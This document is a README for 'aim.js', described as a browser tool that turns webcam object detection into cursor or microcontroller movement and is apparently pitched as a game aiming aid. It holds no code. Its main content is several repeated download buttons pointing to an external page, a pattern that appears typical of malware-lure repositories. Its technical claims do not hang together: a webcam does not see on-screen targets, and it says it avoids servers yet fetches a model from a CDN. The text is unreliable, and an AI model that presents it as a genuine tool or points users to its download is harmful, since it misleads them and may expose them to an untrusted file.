# aim.js - Browser-Based Object Detection & Cursor Controller

> **A compact JavaScript utility for live object detection from a webcam, turning visual input into autonomous cursor motion. Built for browser automation and micro-controller integration.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrewedwardsnoa6598/aimjs-object-detect?style=flat-square)](https://github.com/andrewedwardsnoa6598/aimjs-object-detect)

---

<p align="center">
  <a href="https://andrewedwardsnoa6598.github.io/aimjs-object-detect/">
    <img src="https://img.shields.io/badge/Download-aim.js%20Script-brightgreen?style=for-the-badge" alt="Download aim.js Script">
  </a>
</p>

> **[Direct Download - aim.js](https://andrewedwardsnoa6598.github.io/aimjs-object-detect/)**

---

[Download Latest Build](https://andrewedwardsnoa6598.github.io/aimjs-object-detect/)

---

## What it does

aim.js runs in the browser and uses your webcam to spot objects in real time, then converts their location into cursor coordinates. Everything is handled on the client side, with frame analysis done by a lightweight detection model and no reliance on external servers. That makes it a practical fit for offline use cases where privacy and low latency matter.

The tool can route detected positions into mouse control in two ways: by moving the cursor directly in the browser, or by sending output over serial to micro-controllers such as Arduino and Raspberry Pi Pico. In 2026, the emphasis has been on improving detection precision and trimming processing cost so tracking stays smoother across varying light levels and object shapes.

---

## Core capabilities

- Live object detection powered by browser-side AI models, with no cloud service dependency
- Cursor automation that tracks detected objects on screen
- Support for micro-controller output on Arduino and Raspberry Pi Pico hardware
- Works offline after the initial page load, so no internet connection is needed
- Browser-based and OS-agnostic, with support for Windows, macOS, and Linux
- Lightweight deployment from a single HTML file with embedded JavaScript
- Tunable detection sensitivity and tracking smoothing
- On-screen overlay for bounding boxes and cursor target position

---

## Getting started

1. Download the `index.html` file from the [download page](https://andrewedwardsnoa6598.github.io/aimjs-object-detect/).
2. Open it in a modern web browser. Chrome, Firefox, and Edge are recommended.
3. Allow access to the camera when prompted.
4. The object detection model loads automatically the first time you run it.
5. If you want micro-controller output, plug in your Arduino or Raspberry Pi Pico through USB and choose the matching COM port in the script settings.

For basic browser use, no extra installer or package manager is required.

---

## Settings

| Setting | Default | Description |
|---------|---------|-------------|
| `detectionThreshold` | `0.5` | Confidence level (0-1) required to trigger tracking |
| `smoothingFactor` | `0.3` | Cursor movement smoothing - lower values = faster response |
| `enableOverlay` | `true` | Toggle detection bounding box visualization |
| `microControllerMode` | `none` | Output mode: `none`, `arduino`, or `pi-pico` |
| `baudRate` | `115200` | Serial communication speed for micro-controller output |
| `invertY` | `false` | Invert vertical cursor tracking direction |

---

## Compatibility

- **Browsers:** Chrome 90+, Firefox 90+, Edge 90+, Safari 15+ (with WebGPU support)
- **Micro-controllers:** Arduino Uno/Mega/Nano, Raspberry Pi Pico (RP2040)
- **Operating Systems:** Windows 10/11, macOS 11+, Linux (X11/Wayland)
- **Limitations:** Requires a webcam with at least 720p resolution for reliable detection. Performance may degrade on systems without hardware video encoding support. Micro-controller output requires a serial connection and compatible firmware on the connected device.

---

## FAQ

**Q: Is any framework or library installation needed?**
A: No. Everything runs from one HTML file that includes the JavaScript it needs. On first launch, the detection model is fetched from a CDN and then stored locally in cache.

**Q: What is the update process?**
A: Grab the newest `index.html` from the download page and overwrite the version you already have. Your settings stay in the browser's local storage, so they remain after updating.

**Q: Can the detected objects be customized?**
A: Not in this release. The script uses a general-purpose object detection model based on the COCO dataset, which covers 80 object categories.

**Q: Does it work with every browser game?**
A: It depends on the game's input handling. Browser games that accept ordinary mouse events are the best match. Titles that rely on raw input or exclusive fullscreen modes may ignore cursor movement generated by the script.

**Q: Is webcam footage uploaded or saved anywhere?**
A: No. Processing happens entirely in your browser, and no frames are transmitted to external services or written to disk.

**Q: Can it run without a webcam?**
A: No. A live camera feed is required for detection, so it cannot use prerecorded video or still images.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
